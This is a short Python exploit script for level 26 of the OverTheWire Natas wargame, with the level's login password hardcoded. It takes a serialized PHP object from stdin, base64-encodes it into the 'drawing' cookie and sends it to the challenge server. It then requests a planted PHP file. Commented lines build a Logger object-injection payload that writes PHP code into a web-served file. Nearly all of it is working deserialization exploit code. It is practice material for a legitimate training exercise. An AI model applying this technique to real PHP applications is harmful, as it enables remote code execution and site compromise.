#!/usr/bin/python
import requests, base64, sys

url = "http://natas26.natas.labs.overthewire.org/?"
auth = ("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T")
# php_id = "3hjeo4ltva26j8fodoqfn0okq2"

# Create image file
# params = {
#     "x1": "2",
#     "y1": "1",
#     "x2": "0",
#     "y2": "3",
# }
# r = requests.get(url, auth=auth, params=params)



# Inject mailicious code in file, parse from stdin php
# filename = "img/natas26_" + php_id 
# filename = "/tmp/natas_asdf.log"
# content = "<?php echo test ?>"
# content = "asdf"
# drawing = 'O:6:"Logger":3:{s:13:"LoggerlogFile";s:%i:"%s";s:13:"LoggerinitMsg";s:4:"asdf";s:13:"LoggerexitMsg";s:%i:"%s";}' % (len(filename), filename, len(content), content)
# drawing = 'O:6:"Logger":3:{s:13:"LoggerlogFile";s:%i:"%s";s:7:"initMsg";s:4:"asdf";s:7:"exitMsg";s:%i:"%s";}' % (len(filename), filename, len(content), content)
drawing = sys.stdin.read()
# print("Using SESSID", php_id)
print("Object Injected:", drawing)
print("")

drawing = base64.b64encode(drawing.encode('utf-8')).decode('utf-8')
headers = {
    "Cookie": "drawing=%s;" % (drawing)
}
r = requests.get(url, auth=auth, headers=headers)

print(r.text)

print("Image Data:")
result_img = requests.get("http://natas26.natas.labs.overthewire.org/img/natas26_lyr_exploit.php", auth=auth)
print(result_img.text)
